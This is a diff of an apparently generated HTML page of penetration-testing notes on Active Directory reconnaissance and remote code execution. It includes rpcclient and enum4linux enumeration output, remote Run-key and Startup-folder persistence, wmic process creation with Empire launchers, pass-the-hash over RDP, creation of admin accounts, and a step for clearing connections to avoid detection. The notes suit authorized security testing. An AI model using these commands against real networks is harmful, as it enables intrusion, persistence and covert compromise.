-<li><p class="first">Enum Domain users:</p>
-<div class="highlight-default"><div class="highlight"><pre><span></span>rpcclient $&gt; enumdomusers
-user:[administrator] rid:[0x1f4]
-user:[Guest] rid:[0x1f5]
-user:[krbtgt] rid:[0x1f6]
-user:[_STANDARD] rid:[0x3ee]
-user:[Install] rid:[0x3fa]
-user:[sko] rid:[0x43a]
-user:[cap] rid:[0x589]
-user:[zentrale] rid:[0x67f]
-user:[dbserver] rid:[0x7d9]
-user:[JVOO] rid:[0x7fa]
-user:[Standard HMC User Te] rid:[0x8a0]
-user:[event] rid:[0x8d5]
-user:[remote] rid:[0x9ea]
-user:[pda-vis1] rid:[0xb65]
-user:[TestUser] rid:[0xc46]
-user:[oeinstall] rid:[0x1133]
-user:[repro] rid:[0x13c3]
+</div>
+<div class="section" id="remote-registry">
+<h3>Remote Registry<a class="headerlink" href="#remote-registry" title="Permalink to this headline">¶</a></h3>
+<p>A command to be run or DLL to be loaded when specific events occur, such as boot or login or process execution, as active user or SYSTEM.</p>
+<p>Example:</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">REG</span> <span class="n">ADD</span> \\<span class="n">REMOTECOMPUTERNAME</span>\<span class="n">HKLM</span>\<span class="n">Software</span>\<span class="n">Microsoft</span>\<span class="n">Windows</span>\<span class="n">CurrentVersion</span>\<span class="n">Run</span> <span class="o">/</span><span class="n">v</span> <span class="n">myentry</span> <span class="o">/</span><span class="n">t</span> <span class="n">REG_SZ</span> <span class="o">/</span><span class="n">d</span> <span class="s2">&quot;command to run&quot;</span>
 </pre></div>
 </div>
-</li>
-<li><p class="first">Enum Domain groups:</p>
-</li>
-</ul>
-<blockquote>
-<div><div class="highlight-default"><div class="highlight"><pre><span></span>rpcclient $&gt; enumdomgroups
-group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
-group:[Domain Admins] rid:[0x200]
-group:[Domain Users] rid:[0x201]
-group:[Domain Guests] rid:[0x202]
-group:[Domain Computers] rid:[0x203]
-group:[Domain Controllers] rid:[0x204]
-group:[Schema Admins] rid:[0x206]
-group:[Enterprise Admins] rid:[0x207]
-group:[Group Policy Creator Owners] rid:[0x208]
-group:[Read-only Domain Controllers] rid:[0x209]
-group:[Cloneable Domain Controllers] rid:[0x20a]
-group:[Protected Users] rid:[0x20d]
-group:[xxxx Users] rid:[0x4d8]
-group:[IC Members] rid:[0x50d]
-group:[Event Management] rid:[0x8d7]
-group:[SMSInternalCliGrp] rid:[0x9f5]
-group:[IT Support] rid:[0x105b]
+<p>Command will run every time a user logs in as the user.</p>
+<p>We can query the remote registry also using</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">REG</span> <span class="n">QUERY</span> \\<span class="n">REMOTECOMPUTERNAME</span>\<span class="n">HKLM</span>\<span class="n">Software</span>\<span class="n">Microsoft</span>\<span class="n">Windows</span>\<span class="n">CurrentVersion</span>\<span class="n">Run</span> <span class="o">/</span><span class="n">v</span> <span class="n">myentry</span>
 </pre></div>
 </div>
-</div></blockquote>
-<ul class="simple">
-<li>Enum Group Information and Group Membership</li>
-</ul>
-<blockquote>
-<div><div class="highlight-default"><div class="highlight"><pre><span></span>rpcclient $&gt; querygroup 0x200
-Group Name:     Domain Admins
-Description:    Designated administrators of the domain
-Group Attribute:7
-Num Members:16
+<p>We can delete the remote registry using</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">REG</span> <span class="n">DELETE</span> \\<span class="n">REMOTECOMPUTERNAME</span>\<span class="n">HKLM</span>\<span class="n">Software</span>\<span class="n">Microsoft</span>\<span class="n">Windows</span>\<span class="n">CurrentVersion</span>\<span class="n">Run</span> <span class="o">/</span><span class="n">v</span> <span class="n">myentry</span>
 </pre></div>
 </div>
-<div class="highlight-default"><div class="highlight"><pre><span></span>rpcclient $&gt; querygroupmem 0x200
-rid:[0x2227] attr:[0x7]
-rid:[0x3601] attr:[0x7]
-rid:[0x36aa] attr:[0x7]
-rid:[0x36e0] attr:[0x7]
-rid:[0x3c23] attr:[0x7]
-rid:[0x5528] attr:[0x7]
-rid:[0x1f4] attr:[0x7]
-rid:[0x363b] attr:[0x7]
-rid:[0x573e] attr:[0x7]
-rid:[0x56bc] attr:[0x7]
-rid:[0x5e5e] attr:[0x7]
-rid:[0x7fe1] attr:[0x7]
-rid:[0x86d9] attr:[0x7]
-rid:[0x9367] attr:[0x7]
-rid:[0x829c] attr:[0x7]
-rid:[0xa26e] attr:[0x7]
-</pre></div>
 </div>
-</div></blockquote>
-<ul class="simple">
-<li>Enumerate specfic User/ computer information by RID</li>
-</ul>
-<blockquote>
-<div><div class="highlight-default"><div class="highlight"><pre><span></span>rpcclient $&gt; queryuser 0x3601
-User Name   :   dummy_s
-Full Name   :   Dummy User
-Home Drive  :
-Dir Drive   :
-Profile Path:
-Logon Script:
-Description :   E 5.5.2008 Admin
-Workstations:
-Comment     :
-Logon Time               :      Tue, 24 Jan 2017 19:28:14 IST
-Logoff Time              :      Thu, 01 Jan 1970 05:30:00 IST
-Kickoff Time             :      Thu, 14 Sep 30828 08:18:05 IST
-Password last set Time   :      Fri, 21 Nov 2008 02:34:34 IST
-Password can change Time :      Fri, 21 Nov 2008 02:34:34 IST
-Password must change Time:      Thu, 14 Sep 30828 08:18:05 IST
-</pre></div>
-</div>
-</div></blockquote>
-<ul class="simple">
-<li>Get Domain Password Policy</li>
-</ul>
-<blockquote>
-<div><div class="highlight-default"><div class="highlight"><pre><span></span>rpcclient $&gt; getdompwinfo
-min_password_length: 8
-password_properties: 0x00000000
-</pre></div>
-</div>
-</div></blockquote>
-<ul class="simple">
-<li>Get user password policies</li>
-</ul>
-<blockquote>
-<div><div class="highlight-default"><div class="highlight"><pre><span></span>rpcclient $&gt; getusrdompwinfo 0x3601
-min_password_length: 8
-&amp;info.password_properties: 0x433e6584 (1128162692)
-0: DOMAIN_PASSWORD_COMPLEX
-0: DOMAIN_PASSWORD_NO_ANON_CHANGE
-1: DOMAIN_PASSWORD_NO_CLEAR_CHANGE
-0: DOMAIN_PASSWORD_LOCKOUT_ADMINS
-0: DOMAIN_PASSWORD_STORE_CLEARTEXT
-0: DOMAIN_REFUSE_PASSWORD_CHANGE
-</pre></div>
-</div>
-</div></blockquote>
-</div>
-<div class="section" id="enum4linux">
-<h3>Enum4linux<a class="headerlink" href="#enum4linux" title="Permalink to this headline">¶</a></h3>
-<p>Simple wrapper around the tools in the samba package to provide similar functionality to enum.exe (formerly from www.bindview.com).</p>
-<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">Usage</span><span class="p">:</span> <span class="o">./</span><span class="n">enum4linux</span><span class="o">.</span><span class="n">pl</span> <span class="p">[</span><span class="n">options</span><span class="p">]</span> <span class="n">ip</span>
-
-<span class="n">Options</span> <span class="n">are</span> <span class="p">(</span><span class="n">like</span> <span class="s2">&quot;enum&quot;</span><span class="p">):</span>
-    <span class="o">-</span><span class="n">U</span>        <span class="n">get</span> <span class="n">userlist</span>
-    <span class="o">-</span><span class="n">M</span>        <span class="n">get</span> <span class="n">machine</span> <span class="nb">list</span><span class="o">*</span>
-    <span class="o">-</span><span class="n">S</span>        <span class="n">get</span> <span class="n">sharelist</span>
-    <span class="o">-</span><span class="n">P</span>        <span class="n">get</span> <span class="n">password</span> <span class="n">policy</span> <span class="n">information</span>
-    <span class="o">-</span><span class="n">G</span>        <span class="n">get</span> <span class="n">group</span> <span class="ow">and</span> <span class="n">member</span> <span class="nb">list</span>
-    <span class="o">-</span><span class="n">d</span>        <span class="n">be</span> <span class="n">detailed</span><span class="p">,</span> <span class="n">applies</span> <span class="n">to</span> <span class="o">-</span><span class="n">U</span> <span class="ow">and</span> <span class="o">-</span><span class="n">S</span>
-    <span class="o">-</span><span class="n">u</span> <span class="n">user</span>   <span class="n">specify</span> <span class="n">username</span> <span class="n">to</span> <span class="n">use</span> <span class="p">(</span><span class="n">default</span> <span class="s2">&quot;&quot;</span><span class="p">)</span>
-    <span class="o">-</span><span class="n">p</span> <span class="k">pass</span>   <span class="n">specify</span> <span class="n">password</span> <span class="n">to</span> <span class="n">use</span> <span class="p">(</span><span class="n">default</span> <span class="s2">&quot;&quot;</span><span class="p">)</span>
-
-
-<span class="n">Additional</span> <span class="n">options</span><span class="p">:</span>
-   <span class="o">-</span><span class="n">a</span>        <span class="n">Do</span> <span class="nb">all</span> <span class="n">simple</span> <span class="n">enumeration</span> <span class="p">(</span><span class="o">-</span><span class="n">U</span> <span class="o">-</span><span class="n">S</span> <span class="o">-</span><span class="n">G</span> <span class="o">-</span><span class="n">P</span> <span class="o">-</span><span class="n">r</span> <span class="o">-</span><span class="n">o</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="n">i</span><span class="p">)</span><span class="o">.</span>
-             <span class="n">This</span> <span class="n">opion</span> <span class="ow">is</span> <span class="n">enabled</span> <span class="k">if</span> <span class="n">you</span> <span class="n">don</span><span class="s1">&#39;t provide any other options.</span>
-   <span class="o">-</span><span class="n">h</span>        <span class="n">Display</span> <span class="n">this</span> <span class="n">help</span> <span class="n">message</span> <span class="ow">and</span> <span class="n">exit</span>
-   <span class="o">-</span><span class="n">r</span>        <span class="nb">enumerate</span> <span class="n">users</span> <span class="n">via</span> <span class="n">RID</span> <span class="n">cycling</span>
-   <span class="o">-</span><span class="n">R</span> <span class="nb">range</span>  <span class="n">RID</span> <span class="n">ranges</span> <span class="n">to</span> <span class="nb">enumerate</span> <span class="p">(</span><span class="n">default</span><span class="p">:</span> <span class="mi">500</span><span class="o">-</span><span class="mi">550</span><span class="p">,</span><span class="mi">1000</span><span class="o">-</span><span class="mi">1050</span><span class="p">,</span> <span class="n">implies</span> <span class="o">-</span><span class="n">r</span><span class="p">)</span>
-   <span class="o">-</span><span class="n">K</span> <span class="n">n</span>      <span class="n">Keep</span> <span class="n">searching</span> <span class="n">RIDs</span> <span class="n">until</span> <span class="n">n</span> <span class="n">consective</span> <span class="n">RIDs</span> <span class="n">don</span><span class="s1">&#39;t correspond to</span>
-             <span class="n">a</span> <span class="n">username</span><span class="o">.</span>  <span class="n">Impies</span> <span class="n">RID</span> <span class="nb">range</span> <span class="n">ends</span> <span class="n">at</span> <span class="mf">999999.</span> <span class="n">Useful</span>
-             <span class="n">against</span> <span class="n">DCs</span><span class="o">.</span>
-   <span class="o">-</span><span class="n">l</span>        <span class="n">Get</span> <span class="n">some</span> <span class="p">(</span><span class="n">limited</span><span class="p">)</span> <span class="n">info</span> <span class="n">via</span> <span class="n">LDAP</span> <span class="mi">389</span><span class="o">/</span><span class="n">TCP</span> <span class="p">(</span><span class="k">for</span> <span class="n">DCs</span> <span class="n">only</span><span class="p">)</span>
-   <span class="o">-</span><span class="n">s</span> <span class="n">file</span>   <span class="n">brute</span> <span class="n">force</span> <span class="n">guessing</span> <span class="k">for</span> <span class="n">share</span> <span class="n">names</span>
-   <span class="o">-</span><span class="n">k</span> <span class="n">user</span>   <span class="n">User</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="n">that</span> <span class="n">exists</span> <span class="n">on</span> <span class="n">remote</span> <span class="n">system</span> <span class="p">(</span><span class="n">default</span><span class="p">:</span> <span class="n">administrator</span><span class="p">,</span><span class="n">guest</span><span class="p">,</span><span class="n">krbtgt</span><span class="p">,</span><span class="n">domain</span> <span class="n">admins</span><span class="p">,</span><span class="n">root</span><span class="p">,</span><span class="nb">bin</span><span class="p">,</span><span class="n">none</span><span class="p">)</span>
-             <span class="n">Used</span> <span class="n">to</span> <span class="n">get</span> <span class="n">sid</span> <span class="k">with</span> <span class="s2">&quot;lookupsid known_username&quot;</span>
-             <span class="n">Use</span> <span class="n">commas</span> <span class="n">to</span> <span class="k">try</span> <span class="n">several</span> <span class="n">users</span><span class="p">:</span> <span class="s2">&quot;-k admin,user1,user2&quot;</span>
-   <span class="o">-</span><span class="n">o</span>        <span class="n">Get</span> <span class="n">OS</span> <span class="n">information</span>
-   <span class="o">-</span><span class="n">i</span>        <span class="n">Get</span> <span class="n">printer</span> <span class="n">information</span>
-   <span class="o">-</span><span class="n">w</span> <span class="n">wrkg</span>   <span class="n">Specify</span> <span class="n">workgroup</span> <span class="n">manually</span> <span class="p">(</span><span class="n">usually</span> <span class="n">found</span> <span class="n">automatically</span><span class="p">)</span>
-   <span class="o">-</span><span class="n">n</span>        <span class="n">Do</span> <span class="n">an</span> <span class="n">nmblookup</span> <span class="p">(</span><span class="n">similar</span> <span class="n">to</span> <span class="n">nbtstat</span><span class="p">)</span>
-   <span class="o">-</span><span class="n">v</span>        <span class="n">Verbose</span><span class="o">.</span>  <span class="n">Shows</span> <span class="n">full</span> <span class="n">commands</span> <span class="n">being</span> <span class="n">run</span> <span class="p">(</span><span class="n">net</span><span class="p">,</span> <span class="n">rpcclient</span><span class="p">,</span> <span class="n">etc</span><span class="o">.</span><span class="p">)</span>
-</pre></div>
-</div>
-<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">enum4linux</span> <span class="o">-</span><span class="n">P</span> <span class="o">-</span><span class="n">d</span> <span class="n">xxxx</span><span class="o">.</span><span class="n">abcxxx</span><span class="o">.</span><span class="n">net</span> <span class="o">-</span><span class="n">u</span> <span class="n">mluxxxx</span> <span class="o">-</span><span class="n">p</span> <span class="n">threxxxx</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">65.103</span>
+<div class="section" id="remote-file-access">
+<h3>Remote File Access<a class="headerlink" href="#remote-file-access" title="Permalink to this headline">¶</a></h3>
+<p>We can copy a launcher.bat file with powershell empire and drop it Startup folder, so that it executes every time a user logs in as a user.</p>
+<p>Example:</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">xcopy</span> <span class="n">executabletorun</span><span class="o">.</span><span class="n">exe</span> <span class="s2">&quot;</span><span class="se">\\</span><span class="s2">REMOTECOMPUTERNAME\C$\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\launcher.bat&quot;</span>
 </pre></div>
 </div>
 </div>
 <div class="section" id="winrm">
 <h3>WinRM<a class="headerlink" href="#winrm" title="Permalink to this headline">¶</a></h3>
+<p>Yet to run</p>
 </div>
 <div class="section" id="wmi">
 <h3>WMI<a class="headerlink" href="#wmi" title="Permalink to this headline">¶</a></h3>
+<p>As per the technet article <a class="reference external" href="https://msdn.microsoft.com/en-us/library/aa394582(v=vs.85).aspx">Windows Management Instrumentation</a> (WMI) is the infrastructure for management data and operations on Windows-based operating systems. You can write WMI scripts or applications to automate administrative tasks on remote computers.</p>
+<ul class="simple">
+<li>Local code execution</li>
+</ul>
+<blockquote>
+<div><p>WMI Process Create: The Win32_Process class can be called via WMI to query, modify, terminate, and create running processes.</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">wmic</span> <span class="n">path</span> <span class="n">win32_process</span> <span class="n">call</span> <span class="n">create</span> <span class="s2">&quot;calc.exe&quot;</span>
+<span class="n">Executing</span> <span class="p">(</span><span class="n">win32_process</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">create</span><span class="p">()</span>
+<span class="n">Method</span> <span class="n">execution</span> <span class="n">successful</span><span class="o">.</span>
+<span class="n">Out</span> <span class="n">Paramteres</span><span class="p">:</span>
+<span class="n">instance</span> <span class="n">of</span> <span class="n">__PARAMETERS</span>
+<span class="p">{</span>
+      <span class="n">ProcessId</span> <span class="o">=</span> <span class="mi">2616</span><span class="p">;</span>
+      <span class="n">ReturnValue</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">};</span>
+</pre></div>
+</div>
+<p>The command returns the ProcessID and the ReturnValue (0 abcning no errors)</p>
+</div></blockquote>
+<ul>
+<li><p class="first">Remote code execution</p>
+<p>We can use runas command to authenticate as a different user and then execute commands using wmic or use</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">wmic</span> <span class="o">/</span><span class="n">node</span><span class="p">:</span><span class="n">computername</span> <span class="o">/</span><span class="n">user</span><span class="p">:</span><span class="n">domainname</span>\<span class="n">username</span> <span class="n">path</span> <span class="n">win32_process</span> <span class="n">call</span> <span class="n">create</span> <span class="s2">&quot;**empire launcher string here**&quot;</span>
+
+<span class="n">instead</span> <span class="n">of</span> <span class="n">computername</span><span class="p">,</span> <span class="n">we</span> <span class="n">can</span> <span class="n">specify</span> <span class="n">textfile</span> <span class="n">containing</span> <span class="n">computernames</span> <span class="ow">and</span> <span class="n">specify</span> <span class="n">using</span>
+<span class="n">wmic</span> <span class="o">/</span><span class="n">node</span><span class="p">:</span><span class="nd">@textfile</span>
+</pre></div>
+</div>
+</li>
+</ul>
+<blockquote>
+<div>Refer Rop-Nop blog <a class="reference external" href="https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/">Part3: Wmi and winrm</a></div></blockquote>
 </div>
 <div class="section" id="dcom">
 <h3>DCOM<a class="headerlink" href="#dcom" title="Permalink to this headline">¶</a></h3>
-<ul class="simple">
-<li>MMC20 + Two others Methods (Ask Tanoy/ read) - Enignma</li>
+<ul>
+<li><p class="first">MMC20 + Two others Methods (Ask Tanoy/ read) - Enignma</p>
+<p>Yet to run</p>
+</li>
 </ul>
 </div>
 <div class="section" id="xfreerdp-remote-desktop">
 <h3>xfreerdp/ Remote Desktop<a class="headerlink" href="#xfreerdp-remote-desktop" title="Permalink to this headline">¶</a></h3>
+<ul class="simple">
+<li>rdesktop</li>
+</ul>
 <blockquote>
-<div><p>&#8212;-dsquery !! SubMSI ? &#8211; Twitter one &#8211; who publishes a lot of stuff ? MSUtil to use RCE? / smbexec?</p>
-<p>&#8212;-Any commands if net, or powershell is blocked? or PV/ BH is caught?</p>
+<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">rdesktop</span> <span class="n">IPAddress</span>
+</pre></div>
+</div>
 </div></blockquote>
-<p>Once we get the remote code execution or remote shell, Few useful commands to do recon/ create users</p>
+<ul class="simple">
+<li>Pass the Hash with Remote Desktop: If we have a hash of a user, we can use xfreerdp to have remote desktop</li>
+</ul>
+<blockquote>
+<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">xfreerdp</span> <span class="o">/</span><span class="n">u</span><span class="p">:</span><span class="n">user</span> <span class="o">/</span><span class="n">d</span><span class="p">:</span><span class="n">domain</span> <span class="o">/</span><span class="n">pth</span><span class="p">:</span><span class="nb">hash</span> <span class="o">/</span><span class="n">v</span><span class="p">:</span><span class="n">IPAddress</span>
+</pre></div>
+</div>
+<p>More information refer <a class="reference external" href="https://www.kali.org/penetration-testing/passing-hash-remote-desktop/">Passing the Hash with Remote Desktop</a></p>
+<div class="admonition-todo admonition" id="index-0">
+<p class="first admonition-title">Todo</p>
+<p class="last">&#8212;-dsquery !! SubMSI ? &#8211; Twitter one &#8211; who publishes a lot of stuff ? MSUtil to use RCE? / smbexec?
+&#8212;-Any commands if net, or powershell is blocked? or PV/ BH is caught?</p>
+</div>
+</div></blockquote>
+</div>
+<div class="section" id="hunting-for-a-particular-user">
+<h3>Hunting for a particular User?<a class="headerlink" href="#hunting-for-a-particular-user" title="Permalink to this headline">¶</a></h3>
+<ul class="simple">
+<li>Powerview Invoke-UserHunter</li>
+<li>BH users_sessions</li>
+<li>EventLog AD? How? Not yet successful!</li>
+<li>Finding which machine belong to which user? Any other way than above?</li>
+<li>Machine belongs to which user AD Properties &#8211; GETADObject (Tanoy)</li>
+</ul>
 </div>
 </div>
+<div class="section" id="useful-stuff">
+<h2>Useful Stuff:<a class="headerlink" href="#useful-stuff" title="Permalink to this headline">¶</a></h2>
 <div class="section" id="add-remove-a-local-user">
-<h2>Add/ remove/ a local user<a class="headerlink" href="#add-remove-a-local-user" title="Permalink to this headline">¶</a></h2>
+<h3>Add/ remove/ a local user<a class="headerlink" href="#add-remove-a-local-user" title="Permalink to this headline">¶</a></h3>
 <div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">net</span> <span class="n">user</span> <span class="o">/</span><span class="n">add</span> <span class="p">[</span><span class="n">username</span><span class="p">]</span> <span class="p">[</span><span class="n">password</span><span class="p">]</span>
 </pre></div>
 </div>
@@ -705,60 +1067,60 @@ min_password_length: 8
 <span class="n">The</span> <span class="n">command</span> <span class="n">completed</span> <span class="n">successfully</span><span class="o">.</span>
 </pre></div>
 </div>
-<p>Add a domain user</p>
+</div>
+<div class="section" id="add-a-domain-user">
+<h3>Add a domain user<a class="headerlink" href="#add-a-domain-user" title="Permalink to this headline">¶</a></h3>
 <div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">net</span> <span class="n">user</span> <span class="n">username</span> <span class="n">password</span> <span class="o">/</span><span class="n">ADD</span> <span class="o">/</span><span class="n">DOMAIN</span>
 </pre></div>
 </div>
 </div>
 <div class="section" id="add-remove-a-local-user-to-administrator-group">
-<h2>Add / remove a local user to administrator group<a class="headerlink" href="#add-remove-a-local-user-to-administrator-group" title="Permalink to this headline">¶</a></h2>
+<h3>Add / remove a local user to administrator group<a class="headerlink" href="#add-remove-a-local-user-to-administrator-group" title="Permalink to this headline">¶</a></h3>
 <div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">net</span> <span class="n">localgroup</span> <span class="n">administrators</span> <span class="p">[</span><span class="n">username</span><span class="p">]</span> <span class="o">/</span><span class="n">add</span>
 </pre></div>
 </div>
 </div>
-<div class="section" id="get-sessions-of-remote-machines">
-<h2>Get sessions of remote machines<a class="headerlink" href="#get-sessions-of-remote-machines" title="Permalink to this headline">¶</a></h2>
-<ul class="simple">
-<li>Powerview Get-NetSession</li>
-<li>the windows binary? Global / Local?</li>
-<li>NETDOM? &#8211; Tanoy</li>
-<li>net session</li>
-</ul>
+<div class="section" id="accessing-remote-machines">
+<h3>Accessing Remote machines:<a class="headerlink" href="#accessing-remote-machines" title="Permalink to this headline">¶</a></h3>
+<p>Setup an SMB connection with a host</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="o">&gt;</span> <span class="n">net</span> <span class="n">use</span> \\<span class="n">DC</span><span class="o">.</span><span class="n">xxxxxxxx</span><span class="o">.</span><span class="n">net</span>
+<span class="n">The</span> <span class="n">command</span> <span class="n">completed</span> <span class="n">successfully</span><span class="o">.</span>
+</pre></div>
 </div>
-<div class="section" id="view-users-in-domain-workgroup">
-<h2>View users in Domain / Workgroup<a class="headerlink" href="#view-users-in-domain-workgroup" title="Permalink to this headline">¶</a></h2>
-<ul class="simple">
-<li>Powerview Get-NetUser</li>
-<li>net user /domain</li>
-<li>netdom ?</li>
-</ul>
+<p>Check for access to admin shares (&#8220;C$&#8221;, or &#8220;ADMIN$&#8221;), if we are admin:</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span>PS C:\&gt; dir \\DC.xxxxxxxxxx.net\C$\Users
+
+Directory: \\DC.xxxxxxxx.net\C$\Users
+
+
+Mode                LastWriteTime     Length Name
+----                -------------     ------ ----
+d----        20.11.2016     09:35            adm.xxxxxx
+d----        21.11.2010     06:47            Administrator
+d-r--        14.07.2009     06:57            Public
+</pre></div>
 </div>
-<div class="section" id="view-machines-in-domain-workgroup">
-<h2>View machines in Domain/ Workgroup<a class="headerlink" href="#view-machines-in-domain-workgroup" title="Permalink to this headline">¶</a></h2>
-<ul class="simple">
-<li>Powerview Get-NetComputers</li>
-<li>net view /domain ? &#8211; check the functionality</li>
-<li>view machines affected by GPP vulnerability</li>
-</ul>
+<p>If we are not admin, we might get a access denied:</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span>PS C:\&gt; dir \\DC.xxxxxxxxxx.net\C$\Users
+Access is denied.
+</pre></div>
 </div>
-<div class="section" id="id3">
-<h2>View users in Domain / Workgroup<a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h2>
-<ul class="simple">
-<li>Powerview Get-NetGroupMember</li>
-<li>Net group / domain? options</li>
-<li>BloodHound Group Memberships</li>
-<li>Netdom</li>
-</ul>
+<p>Check your net connections:</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span>PS C:&gt; net use
+New connections will be remembered.
+
+
+Status       Local     Remote                    Network
+
+-------------------------------------------------------------------------------
+OK                     \\DC.xxxxxxxx.net\IPC$   Microsoft Windows Network
+The command completed successfully.
+</pre></div>
 </div>
-<div class="section" id="hunting-for-a-particular-user">
-<h2>Hunting for a particular User?<a class="headerlink" href="#hunting-for-a-particular-user" title="Permalink to this headline">¶</a></h2>
-<ul class="simple">
-<li>Powerview Invoke-UserHunter</li>
-<li>BH users_sessions</li>
-<li>EventLog AD? How? Not yet successful!</li>
-<li>Finding which machine belong to which user? Any other way than above?</li>
-<li>Machine belongs to which user AD Properties &#8211; GETADObject (Tanoy)</li>
-</ul>
+<p>However, if administrator on DC.xxxxx.net runs a net session command, the connections would be detected. For that issue</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">net</span> <span class="n">use</span> <span class="o">/</span><span class="n">delete</span> <span class="o">*</span>
+</pre></div>
+</div>
 <p>Learning from the field: The post-exploitation</p>
 <ul class="simple">
 <li>MSF Webcam - Photo-Video/ Recorder modules</li>
@@ -768,9 +1130,73 @@ min_password_length: 8
 </ul>
 </div>
 </div>
+</div>
 
 
           </div>
+        </div>
+      </div>
+      <div class="sphinxsidebar" role="navigation" aria-label="main navigation">
+        <div class="sphinxsidebarwrapper">
+  <h3><a href="index.html">Table Of Contents</a></h3>
+  <ul>
+<li><a class="reference internal" href="#">Learning from the field : Active Directory Recon and Administrative shells</a><ul>
+<li><a class="reference internal" href="#recon-active-directory">Recon Active Directory:</a><ul>
+<li><a class="reference internal" href="#rpclient">rpclient</a></li>
+<li><a class="reference internal" href="#enum4linux">Enum4linux</a></li>
+<li><a class="reference internal" href="#active-directory-explorer-adexplorer">Active Directory Explorer ADExplorer</a></li>
+<li><a class="reference internal" href="#jxplorer">JXplorer</a></li>
+<li><a class="reference internal" href="#netdom">netdom</a></li>
+<li><a class="reference internal" href="#get-sessions-of-remote-machines">Get sessions of remote machines</a></li>
+<li><a class="reference internal" href="#view-users-in-domain-workgroup">View users in Domain / Workgroup</a></li>
+<li><a class="reference internal" href="#view-machines-in-domain-workgroup">View machines in Domain/ Workgroup</a></li>
+<li><a class="reference internal" href="#view-group-in-domain-workgroup">View group in Domain / Workgroup</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#remote-code-execution-methods">Remote Code Execution Methods:</a><ul>
+<li><a class="reference internal" href="#winexe">Winexe</a></li>
+<li><a class="reference internal" href="#crackmapexec">crackmapexec</a></li>
+<li><a class="reference internal" href="#impacket-psexec-smbexe-wmiexec">Impacket psexec/ smbexe/ wmiexec</a></li>
+<li><a class="reference internal" href="#metasploit-psexec">Metasploit psexec</a></li>
+<li><a class="reference internal" href="#sysinternals-psexec">Sysinternals psexec</a></li>
+<li><a class="reference internal" href="#smbclient">smbclient:</a></li>
+<li><a class="reference internal" href="#task-scheduler">Task Scheduler</a></li>
+<li><a class="reference internal" href="#remote-registry">Remote Registry</a></li>
+<li><a class="reference internal" href="#remote-file-access">Remote File Access</a></li>
+<li><a class="reference internal" href="#winrm">WinRM</a></li>
+<li><a class="reference internal" href="#wmi">WMI</a></li>
+<li><a class="reference internal" href="#dcom">DCOM</a></li>
+<li><a class="reference internal" href="#xfreerdp-remote-desktop">xfreerdp/ Remote Desktop</a></li>
+<li><a class="reference internal" href="#hunting-for-a-particular-user">Hunting for a particular User?</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#useful-stuff">Useful Stuff:</a><ul>
+<li><a class="reference internal" href="#add-remove-a-local-user">Add/ remove/ a local user</a></li>
+<li><a class="reference internal" href="#add-a-domain-user">Add a domain user</a></li>
+<li><a class="reference internal" href="#add-remove-a-local-user-to-administrator-group">Add / remove a local user to administrator group</a></li>
+<li><a class="reference internal" href="#accessing-remote-machines">Accessing Remote machines:</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+  <h4>Previous topic</h4>
+  <p class="topless"><a href="index.html"
+                        title="previous chapter">The Magic of Learning</a></p>
+  <h4>Next topic</h4>
+  <p class="topless"><a href="LFFSecuringDebian.html"
+                        title="next chapter">Learning from the field : Securing your Debian</a></p>
+<div id="searchbox" style="display: none" role="search">
+  <h3>Quick search</h3>
+    <form class="search" action="search.html" method="get">
+      <div><input type="text" name="q" /></div>
+      <div><input type="submit" value="Go" /></div>
+      <input type="hidden" name="check_keywords" value="yes" />
+      <input type="hidden" name="area" value="default" />
+    </form>
+</div>
+<script type="text/javascript">$('#searchbox').show(0);</script>
         </div>
       </div>
       <div class="clearer"></div>
